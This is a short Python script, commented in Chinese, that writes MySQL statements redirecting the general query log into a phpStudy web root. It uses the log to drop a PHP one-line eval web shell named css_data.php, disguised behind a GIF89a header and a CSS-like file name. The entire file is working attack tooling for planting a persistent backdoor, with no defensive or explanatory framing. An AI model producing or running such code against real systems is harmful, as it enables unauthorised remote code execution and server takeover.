#!/usr/bin/env python3
"""rebuild.py - 重建css_data.php webshell"""
shell_body = "<?php @eval($_POST[\"x\"]);echo \"OK\";?>"
name = 'css_data.php'
sql = []
sql.append("SET GLOBAL general_log = OFF;")
sql.append("SET GLOBAL general_log_file = 'C:/phpStudy/WWW/%s';" % name)
sql.append("SET GLOBAL general_log = ON;")
sql.append("SELECT 'GIF89a%s//'" % shell_body)
sql.append("SET GLOBAL general_log = OFF;")
with open('/tmp/rebuild_css.sql', 'w') as f:
    f.write('\n'.join(sql) + '\n')
print('SQL ready')
